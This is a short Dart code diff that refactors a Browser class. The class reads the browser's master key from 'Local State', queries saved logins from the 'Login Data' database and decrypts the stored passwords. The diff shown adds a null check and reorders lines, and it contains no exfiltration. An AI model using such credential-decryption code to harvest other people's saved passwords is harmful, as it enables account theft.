@@ -173,6 +173,8 @@ abstract class Browser {
   }
 
   Future<Uint8List?>? _getMasterKey() {
+    if (historyDir == null) return null;
+
     var f = File(join(historyDir!, 'Local State'));
     if (!f.existsSync()) return null;
 
@@ -185,13 +187,13 @@ abstract class Browser {
   }
 
   Future<List<Password>?> fetchPasswords() async {
-    var _paths = paths(profileFile: 'Login Data');
-
     var key = await _getMasterKey();
 
     if (key == null) return null;
 
     List<Password> passwords = [];
+
+    var _paths = paths(profileFile: 'Login Data');
 
     for (var p in _paths) {
       var size = await File(p).length();
@@ -210,11 +212,10 @@ abstract class Browser {
           'SELECT action_url, username_value, password_value FROM logins');
 
       for (var e in result) {
-        var password = e['password_value'];
-        var pass = _decryptPassword(password, key);
-
         var url = '${e['action_url']}';
         var name = '${e['username_value']}';
+        var password = e['password_value'];
+        var pass = _decryptPassword(password, key);
 
         if (url.isEmpty || name.isEmpty) continue;
 
